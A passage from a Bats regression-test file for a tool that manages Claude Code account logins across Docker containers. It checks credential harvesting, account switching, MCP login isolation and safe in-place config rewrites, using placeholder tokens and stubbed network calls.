  _acct_race_cred "$staged" B 1 1789028800000
  _acct_ident_profile "$_ACCT_UUID_B" lab-b@lab.invalid
  # Nowhere to keep A's login: nothing is written and the staged login stays.
  : > "$CLEAT_ACCOUNTS_DIR/.held"
  run _account_sync_out "$CN"
  assert_equal "unkept $status" "unkept 1"
  run cat "$store"
  assert_output --partial '"accessToken":"at-A0"'
  run grep -c '"accessToken":"at-B1"' "$staged"
  assert_output "1"
  run _account_meta_get a uuid
  assert_failure
  mv "$CLEAT_ACCOUNTS_DIR/.held" "$TEST_TEMP/held-was-a-file"
  # With somewhere to keep it, A's login is held and then B's is saved.
  run _account_sync_out "$CN"
  assert_success
  run cat "$store"
  assert_output --partial '"accessToken":"at-B1"'
  run grep -rl '"refreshToken":"rt-A"' "$CLEAT_ACCOUNTS_DIR/.held"
  assert_success
  run _accounts_held_text
  assert_output --partial "from account a"
  assert_output --partial "replaced by the first login Anthropic verified for its account"
  # The uuid is recorded, so the next login as someone else is held instead.
  run _account_meta_get a uuid
  assert_output "$_ACCT_UUID_B"
}

# The recovery for a login a switch could not verify is adopting it back into
# its account. Adopt copied the entry's identity blanks included, and an entry
# held unverified carries no uuid, so it cleared the uuid of an account the
# server had already verified. If refresh tokens do not rotate the uuid was
# never recorded again, and any later /login as someone else in a box pinned to
# that account went through the first-use harvest and over the adopted login.
@test "regression vnext: a login nobody verified adopted back into its account keeps the account verified" {
  _acct_race_setup
  local CN="cleat-ident-abcdef12" staged d id=""
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/work/.credentials.json" W 0 1789000500000
  printf 'uuid\t%s\nwho\twork@lab.invalid\n' "$_ACCT_UUID_A" > "$CLEAT_ACCOUNTS_DIR/work/meta"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/other/.credentials.json" O 0 1789000500000
  _box_account_write "$CN" work
  # The box rotated work's refresh token. The switch away cannot reach the
  # server (the setup's curl), so it holds that login unverified.
  _acct_race_cred "$staged" R 1 1789028800000
  run _account_do_switch other main "$CN" "$TEST_TEMP/proj"
  assert_success
  for d in "$CLEAT_ACCOUNTS_DIR/.held"/*; do
    grep -q '"refreshToken":"rt-R"' "$d/.credentials.json" 2>/dev/null && id="${d##*/}"
  done
  run test -n "$id"
  assert_success
  run _account_do_adopt "$id" work
  assert_success
  run _account_meta_get work uuid
  assert_output "$_ACCT_UUID_A"
  run _account_meta_get work who
  assert_output "work@lab.invalid"
  # Back on work, then a /login as someone else.
  run _account_do_switch work main "$CN" "$TEST_TEMP/proj"
  assert_success
  _acct_race_cred "$staged" S 1 1789030000000
  _acct_ident_profile "$_ACCT_UUID_B" stranger@lab.invalid
  run _account_sync_out "$CN"
  assert_equal "$status" 2
  run cat "$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
  assert_output --partial '"refreshToken":"rt-R"'
  run _account_meta_get work who
  assert_output "work@lab.invalid"
}

@test "regression vnext: a harvest the server cannot vouch for writes nothing and deletes nothing" {
  _acct_race_setup
  local CN="cleat-ident-abcdef12" store staged code
  store="$CLEAT_ACCOUNTS_DIR/a/.credentials.json"
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  _acct_race_cred "$store" A 0 1789003600000
  printf 'uuid\t%s\n' "$_ACCT_UUID_A" > "$CLEAT_ACCOUNTS_DIR/a/meta"
  _box_account_write "$CN" a
  # A refresh that rotated the token.
  _acct_race_cred "$staged" R 1 1789028800000
  cp "$staged" "$TEST_TEMP/staged.orig"
  for code in 401 000 503; do
    _ACCT_IDENT_CODE="$code"
    # A body that would verify as this very account, so the status code is the
    # only thing that can stop the write. 000 is curl reaching nobody: no body.
    if [[ "$code" == "000" ]]; then
      _ACCT_IDENT_BODY=""
    else
      _ACCT_IDENT_BODY="$(printf '{"account":{"uuid":"%s","email":"lab-a@lab.invalid"}}' "$_ACCT_UUID_A")"
    fi
    _account_profile_curl() { printf '%s\n%s' "$_ACCT_IDENT_BODY" "$_ACCT_IDENT_CODE"; }
    run _account_sync_out "$CN"
    assert_equal "$code $status" "$code 3"
    run cat "$store"
    assert_output --partial '"accessToken":"at-A0"'
    run cmp "$staged" "$TEST_TEMP/staged.orig"
    assert_success
    run test -e "$CLEAT_ACCOUNTS_DIR/.held"
    assert_failure
  done
}

@test "regression vnext: switching away holds a staged login nobody could verify instead of deleting it" {
  _acct_race_setup
  local CN="cleat-ident-abcdef12" staged
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/work/.credentials.json" W 0 1789003600000
  printf 'uuid\t%s\n' "$_ACCT_UUID_A" > "$CLEAT_ACCOUNTS_DIR/work/meta"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/other/.credentials.json" O 0 1789025200000
  # A rotated refresh, and the profile is unreachable (the setup's curl).
  _acct_race_cred "$staged" R 1 1789028800000
  _box_account_write "$CN" work
  run _account_do_switch other main "$CN" "$TEST_TEMP/proj"
  assert_success
  assert_output --partial "Kept a login from"
  run grep -rl '"refreshToken":"rt-R"' "$CLEAT_ACCOUNTS_DIR/.held"
  assert_success
  run cat "$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
  assert_output --partial '"accessToken":"at-W0"'
  run cat "$staged"
  assert_output --partial '"accessToken":"at-O0"'
}

@test "regression vnext: switching away never stamps the account with the email in the box project file" {
  _acct_race_setup
  local CN="cleat-ident-abcdef12" key
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/a/.credentials.json" A 0 1789025200000
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/b/.credentials.json" B 0 1789025200000
  printf 'who\tlab-b@lab.invalid\n' > "$CLEAT_ACCOUNTS_DIR/b/meta"
  # The box ran as b, so its staged file is b's own and the harvest has nothing
  # to do. Its project file still names a, from an earlier session.
  _acct_race_cred "$CLEAT_RUN_DIR/$CN/auth/.credentials.json" B 0 1789025200000
  _box_account_write "$CN" b
  key="$(_derive_project_session_key "$TEST_TEMP/proj" main)"
  mkdir -p "$CLEAT_PROJECTS_DIR/$key"
  printf '{"oauthAccount":{"emailAddress":"lab-a@lab.invalid","organizationName":"Org A"}}\n' \
    > "$CLEAT_PROJECTS_DIR/$key/claude.json"
  run _account_do_switch a main "$CN" "$TEST_TEMP/proj"
  assert_success
  run _account_meta_get b who
  assert_output "lab-b@lab.invalid"
  run _account_meta_get a who
  assert_failure
}

# ─────────────────────────────────────────────────────────────────────────────
# vnext: a switch staged the incoming login by removing the staged file and
# renaming the new one in later. For about 25 ms the box had no credential file,
# and a Claude the live gate missed answered "Not logged in" into that moment.
# Both staging directions also copied the WHOLE file. Claude Code keeps an MCP
# server's login (mcpOAuth) in that same file, so an in-box `claude mcp login`
# was erased at the next attach (Claude then called the server with no bearer)
# and one box's MCP tokens reached the account store and every box pinned to it.
# Only the account's keys cross now, by one rename.
#
# Fixtures follow the account fixture convention: accessToken carries the
# generation, refreshToken the grant.
# ─────────────────────────────────────────────────────────────────────────────
# $1 grant, $2 generation, $3 expiresAt (epoch ms). A member, not an object.
_acct_key_login() {
  printf '"claudeAiOauth":{"accessToken":"at-%s%s","refreshToken":"rt-%s","expiresAt":%s,"scopes":["user:inference"],"subscriptionType":"max"}' "$1" "$2" "$1" "$3"
}

# $1 label. The shape Claude Code 2.1.270 writes for an MCP server login.
_acct_key_mcp() {
  printf '"mcpOAuth":{"linear|0123456789abcdef":{"serverName":"linear","serverUrl":"https://mcp.linear.app/mcp","accessToken":"FAKE-MCP-%s","refreshToken":"FAKE-MCP-R-%s","expiresAt":1789002000000,"scope":"read"}}' "$1" "$1"
}

@test "regression vnext: a switch never leaves the box without a credential file even for a moment" {
  _acct_race_setup
  local CN="cleat-gap-abcdef12" staged f
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/old/.credentials.json" O 0 1789003600000
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/new/.credentials.json" N 0 1789003600000
  _acct_race_cred "$staged" O 0 1789003600000
  _box_account_write "$CN" old
  # Every step from the last harvest to the rename looks at the staged path as
  # it starts, which is what a Claude reading at that moment would have found.
  export GAP_STAGED="$staged" GAP_LOG="$TEST_TEMP/gap.log"
  : > "$GAP_LOG"
  for f in _account_release_staged_locked _box_account_write _account_sync_in_locked _account_write_file_0600; do
    eval "$(declare -f "$f" | sed "1s/^$f /_gap_orig_$f /")"
    eval "$f() { if [[ -e \"\$GAP_STAGED\" ]]; then echo \"$f present\"; else echo \"$f gone\"; fi >> \"\$GAP_LOG\"; _gap_orig_$f \"\$@\"; }"
  done
  run _account_do_switch new main "$CN" "$TEST_TEMP/proj"
  assert_success
  run cat "$GAP_LOG"
  refute_output --partial "gone"
  # The probe ran at the pin write and inside the staging, so a pass is not vacuous.
  assert_output --partial "_box_account_write present"
  assert_output --partial "_account_write_file_0600 present"
  run cat "$staged"
  assert_output --partial '"accessToken":"at-N0"'
}

@test "regression vnext: an MCP server login made inside a pinned box survives the next attach" {
  _acct_race_setup
  local CN="cleat-mcp-abcdef12" staged store
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  store="$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
  mkdir -p "${store%/*}"
  printf '{%s}\n' "$(_acct_key_login W 0 1789003600000)" > "$store"
  _box_account_write "$CN" work
  run _account_sync_in "$CN"
  assert_success
  # In the box: `claude mcp login linear`. Claude rewrites its store with the
  # MCP entry after the login it already had and refreshes nothing.
  printf '{%s,%s}\n' "$(_acct_key_login W 0 1789003600000)" "$(_acct_key_mcp box1)" > "$staged"
  run _account_sync_out "$CN"
  assert_success
  run _account_sync_in "$CN"
  assert_success
  run cat "$staged"
  assert_output --partial '"accessToken":"FAKE-MCP-box1"'
  assert_output --partial '"accessToken":"at-W0"'
  # A sibling box on the same account refreshed it, so this attach stages the
  # newer login and keeps the MCP login beside it.
  printf '{%s}\n' "$(_acct_key_login W 1 1789028800000)" > "$store"
  run _account_sync_in "$CN"
  assert_success
  run cat "$staged"
  assert_output --partial '"accessToken":"FAKE-MCP-box1"'
  assert_output --partial '"accessToken":"at-W1"'
  refute_output --partial '"accessToken":"at-W0"'
}

@test "regression vnext: one box's MCP login never reaches the account store or another box" {
  _acct_race_setup
  local one="cleat-one-abcdef12" two="cleat-two-abcdef12" store
  store="$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
  mkdir -p "${store%/*}" "$CLEAT_RUN_DIR/$one/auth" "$CLEAT_RUN_DIR/$two/auth"
  printf '{%s}\n' "$(_acct_key_login W 0 1789003600000)" > "$store"
  _box_account_write "$one" work
  _box_account_write "$two" work
  printf '{%s,%s}\n' "$(_acct_key_login W 0 1789003600000)" "$(_acct_key_mcp two)" \
    > "$CLEAT_RUN_DIR/$two/auth/.credentials.json"
  # Box one signed into its own MCP server and Claude refreshed the login.
  printf '{%s,%s}\n' "$(_acct_key_login W 1 1789028800000)" "$(_acct_key_mcp one)" \
    > "$CLEAT_RUN_DIR/$one/auth/.credentials.json"
  run _account_sync_out "$one"
  assert_success
  run cat "$store"
  assert_output --partial '"accessToken":"at-W1"'
  refute_output --partial "FAKE-MCP"
  run _account_sync_in "$two"
  assert_success
  run cat "$CLEAT_RUN_DIR/$two/auth/.credentials.json"
  assert_output --partial '"accessToken":"at-W1"'
  assert_output --partial "FAKE-MCP-two"
  refute_output --partial "FAKE-MCP-one"
}

@test "regression vnext: switching a box to another account keeps its own MCP login" {
  _acct_race_setup
  local CN="cleat-mcp-abcdef12" staged
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  mkdir -p "$CLEAT_ACCOUNTS_DIR/old" "$CLEAT_ACCOUNTS_DIR/new" "${staged%/*}"
  printf '{%s}\n' "$(_acct_key_login O 1 1789028800000)" > "$CLEAT_ACCOUNTS_DIR/old/.credentials.json"
  printf '{%s}\n' "$(_acct_key_login N 0 1789000100000)" > "$CLEAT_ACCOUNTS_DIR/new/.credentials.json"
  _box_account_write "$CN" old
  # The box's login is the fresher one, which newest-wins alone would keep.
  printf '{%s,%s}\n' "$(_acct_key_mcp box1)" "$(_acct_key_login O 1 1789028800000)" > "$staged"
  run _account_do_switch new main "$CN" "$TEST_TEMP/proj"
  assert_success
  run cat "$staged"
  assert_output --partial '"accessToken":"at-N0"'
  refute_output --partial '"accessToken":"at-O1"'
  assert_output --partial "FAKE-MCP-box1"
  run cat "$CLEAT_ACCOUNTS_DIR/old/.credentials.json"
  assert_output --partial '"accessToken":"at-O1"'
  refute_output --partial "FAKE-MCP"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.4.3: cleat clean asked docker whether each box still exists and pruned on
# every "no". With the daemon down every answer is no, so it removed every box
# description and every run dir (the overlays, the conversations' file history
# and a staged login) for boxes that still existed. It now refuses.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.4.3: cleat clean with Docker down removes no box state" {
  local cn="cleat-live-aaaa1111"
  _daemon_up() { return 1; }
  container_exists() { return 1; }
  mkdir -p "$CLEAT_RUN_DIR/$cn/settings" "$CLEAT_BOXES_DIR"
  printf 'a box that still exists\n' > "$CLEAT_BOXES_DIR/$cn"
  run cmd_clean
  assert_failure
  assert_output --partial "Docker is not running"
  assert_output --partial "Nothing was removed"
  run test -d "$CLEAT_RUN_DIR/$cn/settings"
  assert_success
  run test -f "$CLEAT_BOXES_DIR/$cn"
  assert_success
}

# ─────────────────────────────────────────────────────────────────────────────
# The box sees its per-project claude.json through a single-file bind mount, so
# cleat rewrites it in place. `cat tmp > f` truncates first, and Claude Code
# reads the file inside that empty window: a running session "auto-repairs" by
# writing its cached copy (the OLD identity) back in place, the rest of cleat's
# write lands on top and the file is left as broken JSON. A session starting in
# the window stops on "Configuration error". Reproduced against Claude Code
# 2.1.270 with rename made to fail the way it does on a bind mount.
#
# The stand-in reader below runs at the moment cleat starts copying its temp
# file into place, which is exactly the window, and does what Claude does with
# an unparseable file on a bind mount.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression vnext: the identity delete never empties claude.json under a reading Claude" {
  command -v jq >/dev/null || skip "needs jq"
  CLEAT_PROJECTS_DIR="$TEST_TEMP/home/.config/cleat/projects"
  local key f cached
  key="$(_derive_project_session_key "$TEST_TEMP/proj" main)"
  mkdir -p "$CLEAT_PROJECTS_DIR/$key"
  f="$CLEAT_PROJECTS_DIR/$key/claude.json"
  printf '{\n  "oauthAccount": {"emailAddress": "previous@example.com", "organizationName": "Previous Org"},\n  "userID": "abc",\n  "projects": {"/workspace": {"lastCost": 1}}\n}\n' > "$f"
  cached="$(command cat "$f")"
  _daemon_up() { return 1; }     # nothing running: the write is allowed
  _with_reading_claude() {
    cat() {
      if [[ "${1:-}" == "$f".* ]]; then
        : >> "$TEST_TEMP/copy-seen"
        if ! _looks_like_json_object "$f"; then
          : >> "$TEST_TEMP/claude-saw-bad-json"
          printf '%s\n' "$cached" > "$f"   # Claude's in-place auto-repair
        fi
      fi
      command cat "$@"
    }
    _account_invalidate_identity "$@"
  }
  run _with_reading_claude "$TEST_TEMP/proj" main
  assert_success
  run test -e "$TEST_TEMP/copy-seen"
  assert_success
  run test -e "$TEST_TEMP/claude-saw-bad-json"
  assert_failure
  run jq -e 'type=="object"' "$f"
  assert_success
  run jq -r '.oauthAccount // "absent"' "$f"
  assert_output "absent"
  run jq -r '.userID' "$f"
  assert_output "abc"
}

# ─────────────────────────────────────────────────────────────────────────────
# The switch checks for a live session once, at the top. Then it harvests,
# stages, captures metadata and polls usage with a three second timeout before
# it reaches the identity delete. A claude started from another terminal in that
# time was written under, and deleting oauthAccount beneath a running Claude
# Code makes it refuse every later save of its config
# (tengu_config_auth_loss_prevented, 4 of 4 against 2.1.270). The delete asks
# again right before it writes, and the switch says how to finish the job.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression vnext: a Claude that starts during an account switch keeps its identity file untouched" {
  command -v jq >/dev/null || skip "needs jq"
  CLEAT_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/accounts"
  CLEAT_BOX_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/box-accounts"
  CLEAT_RUN_DIR="$TEST_TEMP/home/.config/cleat/run"
  CLEAT_PROJECTS_DIR="$TEST_TEMP/home/.config/cleat/projects"
  mkdir -p "$CLEAT_ACCOUNTS_DIR" "$CLEAT_BOX_ACCOUNTS_DIR" "$CLEAT_RUN_DIR" "$CLEAT_PROJECTS_DIR"
  _CLEAT_NOW_S=1789000000
  curl() { cat >/dev/null 2>&1; return 7; }
  local CN="cleat-proj-abcdef12" key f
  mkdir -p "$CLEAT_ACCOUNTS_DIR/work"
  chmod 700 "$CLEAT_ACCOUNTS_DIR/work"
  printf '{"claudeAiOauth":{"accessToken":"a-token","refreshToken":"r-token","expiresAt":1789003600000,"subscriptionType":"max"}}\n' > "$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
  chmod 600 "$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
  key="$(_derive_project_session_key "$TEST_TEMP/proj" main)"
  mkdir -p "$CLEAT_PROJECTS_DIR/$key"
  f="$CLEAT_PROJECTS_DIR/$key/claude.json"
  printf '{"oauthAccount":{"emailAddress":"previous@example.com"},"userID":"abc"}\n' > "$f"
  _daemon_up() { return 0; }
  container_exists() { return 0; }
  is_running() { return 0; }
  _account_box_ready() { return 0; }
  # Not live when the switch first asks, live from then on. A counter, never a
  # sleep: the interleaving is the point, the timing is not.
  _box_has_live_agent() {
    [[ -e "$TEST_TEMP/claude-started" ]] && return 0
    : > "$TEST_TEMP/claude-started"
    return 1
  }
  run _account_do_switch work main "$CN" "$TEST_TEMP/proj"
  assert_success
  assert_output --partial "during the switch"
  assert_output --partial "cleat stop main"
  run jq -r '.oauthAccount.emailAddress' "$f"
  assert_output "previous@example.com"
  run _box_account_read "$CN"
  assert_output "work"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.4.3: the same truncating write in the attach heal, which has shipped since
# v1.1.1. It runs while no claude is live in the box, but a second terminal
# attaching at the same moment starts one that reads the file in the window and
# stops on "Configuration error ... Reset with default configuration"
# (reproduced against 2.1.270).
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.4.3: the attach heal never empties claude.json under a starting Claude" {
  command -v jq >/dev/null || skip "needs jq"
  CLEAT_PROJECTS_DIR="$TEST_TEMP/home/.config/cleat/projects"
  local key f
  mkdir -p "$TEST_TEMP/project"
  key="$(_derive_project_session_key "$TEST_TEMP/project" main)"
  mkdir -p "$CLEAT_PROJECTS_DIR/$key"
  f="$CLEAT_PROJECTS_DIR/$key/claude.json"
  printf '{\n  "hasCompletedOnboarding": false,\n  "oauthAccount": {"emailAddress": "heal@login.dev"},\n  "projects": {"/workspace": {"x": 1}}\n}\n' > "$f"
  rm -f "${HOME}/.claude.json"
  _box_has_live_agent() { return 1; }
  _with_starting_claude() {
    cat() {
      if [[ "${1:-}" == "$f".* ]]; then
        : >> "$TEST_TEMP/copy-seen"
        _looks_like_json_object "$f" || : >> "$TEST_TEMP/claude-saw-bad-json"
      fi
      command cat "$@"
    }
    _refresh_attached_claude_json heal-ctr "$TEST_TEMP/project" main
  }
  run _with_starting_claude
  assert_success
  run test -e "$TEST_TEMP/copy-seen"
  assert_success
  run test -e "$TEST_TEMP/claude-saw-bad-json"
  assert_failure
  run jq -r '.hasCompletedOnboarding' "$f"
  assert_output "true"
  run jq -r '.projects["/workspace"].x' "$f"
  assert_output "1"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.4.3: the heal's live check ran before a rebuild that scans every sibling
# project, so a claude started by another terminal during that scan was written
# under. The check is repeated immediately before the write.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.4.3: the attach heal asks for a live Claude again right before it writes" {
  command -v jq >/dev/null || skip "needs jq"
  CLEAT_PROJECTS_DIR="$TEST_TEMP/home/.config/cleat/projects"
  local key f
  mkdir -p "$TEST_TEMP/project"
  key="$(_derive_project_session_key "$TEST_TEMP/project" main)"
  mkdir -p "$CLEAT_PROJECTS_DIR/$key"
  f="$CLEAT_PROJECTS_DIR/$key/claude.json"
  printf '{"hasCompletedOnboarding":false,"projects":{"/workspace":{"x":1}}}\n' > "$f"
  rm -f "${HOME}/.claude.json"
  _box_has_live_agent() {
    [[ -e "$TEST_TEMP/claude-started" ]] && return 0
    : > "$TEST_TEMP/claude-started"
    return 1
  }
  run _refresh_attached_claude_json heal-ctr "$TEST_TEMP/project" main
  assert_success
  run jq -r '.hasCompletedOnboarding' "$f"
  assert_output "false"
}

# ─────────────────────────────────────────────────────────────────────────────
# `cleat account rm` dropped every pin to the account and left the account's
# oauthAccount in each pinned box's per-project claude.json. The default switch
# already dropped it. The remove could not: it knows those boxes only by
# container name, the name truncates the directory segment and the project path
# is recorded nowhere. A detached box that is still running passes the live
# gate and is never rebuilt, so its next session ran on the shared login under
# the removed account's email. On a host whose own ~/.claude.json has no
# oauthAccount, the stopped-box rebuild kept it too. The pin now carries the
# box's per-project key on a second line.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression vnext: removing an account drops the identity its pinned boxes carry" {
  command -v jq >/dev/null || skip "needs jq"
  CLEAT_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/accounts"
  CLEAT_BOX_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/box-accounts"
  CLEAT_RUN_DIR="$TEST_TEMP/home/.config/cleat/run"
  CLEAT_PROJECTS_DIR="$TEST_TEMP/home/.config/cleat/projects"
  mkdir -p "$CLEAT_ACCOUNTS_DIR" "$CLEAT_BOX_ACCOUNTS_DIR" "$CLEAT_RUN_DIR" "$CLEAT_PROJECTS_DIR"
  _CLEAT_NOW_S=1789000000
  curl() { cat >/dev/null 2>&1; return 7; }
  mkdir -p "$CLEAT_ACCOUNTS_DIR/work" "$TEST_TEMP/proj-a" "$TEST_TEMP/proj-b"
  chmod 700 "$CLEAT_ACCOUNTS_DIR/work"
  printf '{"claudeAiOauth":{"accessToken":"a-token","refreshToken":"r-token","expiresAt":1789003600000,"subscriptionType":"max"}}\n' \
    > "$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
  chmod 600 "$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
  # Two boxes in two projects, one of them a named box, pinned through the real
  # switch with the daemon down.
  _daemon_up() { return 1; }
  container_exists() { return 1; }
  _box_has_live_agent() { return 1; }
  local pa="$TEST_TEMP/proj-a" pb="$TEST_TEMP/proj-b" ca cb fa fb
  ca="$(container_name_for "$pa" main)"
  cb="$(container_name_for "$pb" dev)"
  run _account_do_switch work main "$ca" "$pa"
  assert_success
  run _account_do_switch work dev "$cb" "$pb"
  assert_success
  fa="$CLEAT_PROJECTS_DIR/$(_derive_project_session_key "$pa" main)/claude.json"
  fb="$CLEAT_PROJECTS_DIR/$(_derive_project_session_key "$pb" dev)/claude.json"
  mkdir -p "${fa%/*}" "${fb%/*}"
  # What Claude writes into each box once it has fetched the profile as work.
  printf '{"oauthAccount":{"emailAddress":"work@example.com","profileFetchedAt":1789000000000},"userID":"abc","hasCompletedOnboarding":true}\n' > "$fa"
  cp "$fa" "$fb"
  # Both detached and still running: no live claude, so the gate lets it through.
  _daemon_up() { return 0; }
  container_exists() { return 0; }
  is_running() { return 0; }
  _box_has_live_agent() { return 1; }
  run _account_do_remove work 1
  assert_success
  run _box_account_read "$cb"
  assert_output "default"
  run jq -r '.oauthAccount // "absent"' "$fa"
  assert_output "absent"
  run jq -r '.oauthAccount // "absent"' "$fb"
  assert_output "absent"
  # A targeted delete on a live bind source, not a rebuild.
  run jq -r '.userID' "$fb"
  assert_output "abc"
}

# ─────────────────────────────────────────────────────────────────────────────
# An in-box login lands only in that box's per-project claude.json, so an
# unpinned box picks the newest sibling file that has one. A box on a NAMED
# account holds that account's identity there, and the file says nothing about
# whose it is, so the newest pinned sibling stamped every shared-login box with
# the other person's email. concept/44 claimed this guard existed. It did not.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression vnext: an unpinned box never inherits a pinned sibling's account name" {
  command -v jq >/dev/null || skip "needs jq"
  CLEAT_BOX_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/box-accounts"
  CLEAT_PROJECTS_DIR="$TEST_TEMP/home/.config/cleat/projects"
  mkdir -p "$CLEAT_BOX_ACCOUNTS_DIR" "$CLEAT_PROJECTS_DIR"
  printf '{"projects":{}}\n' > "$HOME/.claude.json"
  local pinned_key="pinned-11111111" shared_key="shared-22222222" out
  mkdir -p "$CLEAT_PROJECTS_DIR/$pinned_key" "$CLEAT_PROJECTS_DIR/$shared_key"
  printf '{"oauthAccount":{"emailAddress":"work@example.com"},"hasCompletedOnboarding":true}\n' \
    > "$CLEAT_PROJECTS_DIR/$pinned_key/claude.json"
  printf '{"oauthAccount":{"emailAddress":"shared@example.com"},"hasCompletedOnboarding":true}\n' \
    > "$CLEAT_PROJECTS_DIR/$shared_key/claude.json"
  # The pinned one is the NEWEST, so without the guard it wins the scan.
  touch -t 202601010101.01 "$CLEAT_PROJECTS_DIR/$shared_key/claude.json"
  touch -t 202601010202.02 "$CLEAT_PROJECTS_DIR/$pinned_key/claude.json"
  _box_account_write "cleat-pinned-11111111" work "$pinned_key"
  out="$CLEAT_PROJECTS_DIR/third-33333333/claude.json"
  run _build_project_claude_json "$out"
  assert_success
  run jq -r '.oauthAccount.emailAddress' "$out"
  assert_output "shared@example.com"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.4.3: `cleat login` never signed anyone in. Claude Code has no top-level
# `login` subcommand, so commander read the word as the first PROMPT of an
# interactive session. A signed-in box sent it to the model as a real request
# and kept a conversation called "login". A signed-out one answered "Not logged
# in". Nothing errored, and the command always claimed the shared ~/.claude.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.4.3: cleat login runs claude auth login, never a bare login prompt" {
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$cname"
  _host_open_cmd() { echo ""; }
  run cmd_login "$TEST_TEMP/project"
  assert_success
  run grep -c -e "-- claude auth login\$" "$DOCKER_CALLS"
  assert_output "1"
  run grep -c -e "-- claude login\$" "$DOCKER_CALLS"
  assert_output "0"
}

# A pinned box whose `docker exec` of `claude auth login` does what Claude Code
# does: write the store the override names. $1 = 1 to write, 0 to write nothing.
_b13_pinned_login_box() {
  CLEAT_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/accounts"
  CLEAT_BOX_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/box-accounts"
  CLEAT_RUN_DIR="$TEST_TEMP/home/.config/cleat/run"
  mkdir -p "$CLEAT_ACCOUNTS_DIR" "$CLEAT_BOX_ACCOUNTS_DIR" "$CLEAT_RUN_DIR" "$TEST_TEMP/project"
  _B13_CNAME="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$_B13_CNAME"
  _host_open_cmd() { echo ""; }
  _daemon_up() { return 0; }
  container_exists() { return 0; }
  _account_ensure_dir fresh
  _box_account_write "$_B13_CNAME" fresh
  _B13_STAGED="$(_account_box_auth_dir "$_B13_CNAME")/.credentials.json"
  _B13_WRITES="$1"
  # The harvest asks the server whose login this is. A shell function also
  # satisfies the `command -v curl` guard on a host with no curl at all.
  curl() { cat >/dev/null 2>&1; return 7; }
  _account_profile_curl() {
    printf '{"account":{"uuid":"0b8f2a6e-1c3d-4e5f-8a9b-0c1d2e3f4a5b","email":"fresh@example.com"},"organization":{"uuid":"org-1","name":"Acme Ltd","cc_onboarding_flags":{}}}\n200'
  }
  docker() {
    case "$1" in
      inspect) printf '%s\n' "/home/coder/.cleat-auth" ;;
      exec)
        if [[ "$_B13_WRITES" == 1 && "$*" == *"CLAUDE_SECURESTORAGE_CONFIG_DIR="*"-- claude auth login" ]]; then
          mkdir -p "${_B13_STAGED%/*}"
          printf '{"claudeAiOauth":{"accessToken":"sk-ant-oat01-b13","refreshToken":"sk-ant-ort01-b13","expiresAt":%s,"subscriptionType":"max"}}\n' \
            "$(( ($(date +%s) + 28800) * 1000 ))" > "$_B13_STAGED"
        fi
        command docker "$@" ;;
      *) command docker "$@" ;;
    esac
  }
}

@test "regression v1.4.3: cleat login on a pinned box saves the login into the account, not ~/.claude" {
  # The login lands in the box's staged copy and nothing harvested it. The
  # account still read "signed out" and the next attach's staging deleted the
  # new login. The success line named the shared ~/.claude it never touched.
  _b13_pinned_login_box 1
  run cmd_login "$TEST_TEMP/project"
  assert_success
  assert_output --partial "Auth saved to account"
  refute_output --partial "~/.claude"
  run _account_auth_state fresh
  assert_output "ok"
  run grep -c "sk-ant-ort01-b13" "$(_account_cred_path fresh)"
  assert_output "1"
}

@test "regression v1.4.3: cleat login never reports a login saved that did not reach the pinned account" {
  # The store override is an undocumented Claude Code variable. A Claude that
  # exits 0 without writing the relocated store must not be reported as a login
  # saved under the account's name.
  _b13_pinned_login_box 0
  run cmd_login "$TEST_TEMP/project"
  assert_success
  assert_output --partial "did not reach account"
  refute_output --partial "Auth saved"
}

@test "regression v1.4.3: a failed cleat login exits non-zero and claims nothing" {
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$cname"
  _host_open_cmd() { echo ""; }
  export DOCKER_EXIT_CODE=1
  run cmd_login "$TEST_TEMP/project"
  assert_failure
  refute_output --partial "Auth saved"
}

# ─────────────────────────────────────────────────────────────────────────────
# vnext: the browser destination gate shipped without the hosts Claude Code
# 2.1.270 actually authorizes at (claude.com and platform.claude.com). The gate
# refused the one login Cleat ships a bridge FOR, so the watcher never opened
# the URL and never started the callback proxy, and every login fell back to
# pasting a code by hand while `cleat login` promised the browser would open.
